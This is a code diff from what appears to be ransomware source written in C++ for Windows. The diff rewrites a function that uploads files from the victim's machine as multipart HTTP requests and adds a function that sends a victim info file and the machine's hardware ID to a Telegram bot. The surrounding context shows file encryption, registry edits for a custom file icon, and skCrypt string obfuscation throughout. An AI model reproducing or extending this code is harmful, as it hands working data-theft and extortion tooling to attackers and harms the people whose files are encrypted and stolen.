@@ -506,25 +506,15 @@ void encryptFiles(vector<string> files, string key) {
 void uploadFiles(vector<string> files) {
     for (string file : files) {
         string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
-        string str_header = (string)skCrypt("Content-Type: multipart/form-data; boundary=----") + boundary;
-        string str_open = (string)skCrypt("------") + boundary + (string)skCrypt("\nContent-Disposition: form-data; name=\"file\"; filename=\"") + split(file, '\\').back() + (string)skCrypt("\"\nContent-Type: application/octet-stream\n\n");
-        string str_close = (string)skCrypt("\n------") + boundary + (string)skCrypt("--\n");
+        string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
+        string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
+        string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
         string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
 
-        FILE* fp = NULL;
-        fopen_s(&fp, file.c_str(), skCrypt("rb"));
-        if (!fp)
-            continue;
-
-        fseek(fp, 0, SEEK_END);
-        long filesize = ftell(fp);
-        rewind(fp);
-        int datalen = filesize + str_open.length() + str_close.length();
-        char* data = (char*)malloc(datalen);
-
-        strcpy_s(data, datalen, str_open.c_str());
-        fread(data + str_open.length(), 1, filesize, fp);
-        memcpy(data + str_open.length() + filesize, str_close.c_str(), str_close.length());
+        ifstream rFile(file, ios::in);
+        stringstream buffer;
+        buffer << rFile.rdbuf();
+        string data = beggining + buffer.str() + ending;
 
         HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;
 
@@ -540,7 +530,7 @@ void uploadFiles(vector<string> files) {
         if (!hrequest)
             goto cleanup;
 
-        if (!HttpSendRequestA(hrequest, str_header.c_str(), (DWORD)-1, data, datalen))
+        if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
             goto cleanup;
 
         DWORD received;
@@ -559,7 +549,6 @@ void uploadFiles(vector<string> files) {
 
 
     cleanup:
-        fclose(fp);
         if (hsession)
             InternetCloseHandle(hsession);
         if (hconnect)
@@ -854,4 +843,59 @@ void changeIcon() {
     createAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);
 
     exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
+}
+
+void sendTelegramInfo() {
+    string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
+    string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
+    string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n") + CHAT_ID +
+        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + getHWID() +
+        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
+    string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
+    string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");
+
+
+    ifstream rFile(INFOFILE, ios::in);
+    stringstream buffer;
+    buffer << rFile.rdbuf();
+    string data = beggining + buffer.str() + ending;
+
+    HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;
+
+    hsession = InternetOpenA(userAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hsession)
+        goto cleanup;
+
+    hconnect = InternetConnectA(hsession, skCrypt("api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hconnect)
+        goto cleanup;
+
+    hrequest = HttpOpenRequestA(hconnect, skCrypt("POST"), ((string)skCrypt("/bot") + BOT_TOKEN + (string)skCrypt("/sendDocument")).c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+    if (!hrequest)
+        goto cleanup;
+
+    if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
+        goto cleanup;
+
+    DWORD received;
+    BYTE buf[1024];
+    while (InternetReadFile(hrequest, buf, sizeof(buf), &received) && received) {
+        buf[received] = 0;
+        char str[sizeof(buf) + 1];
+        memcpy(str, buf, sizeof(buf));
+        str[sizeof(buf)] = 0;
+        filesLink.push_back(str);
+        Json data = Json::parse(str);
+        if (!data[(string)skCrypt("ok")] && DEBUG)
+            cout << skCrypt("Info file not sent via telegram bot") << endl;
+    }
+
+
+cleanup:
+    if (hsession)
+        InternetCloseHandle(hsession);
+    if (hconnect)
+        InternetCloseHandle(hconnect);
+    if (hrequest)
+        InternetCloseHandle(hrequest);
 }
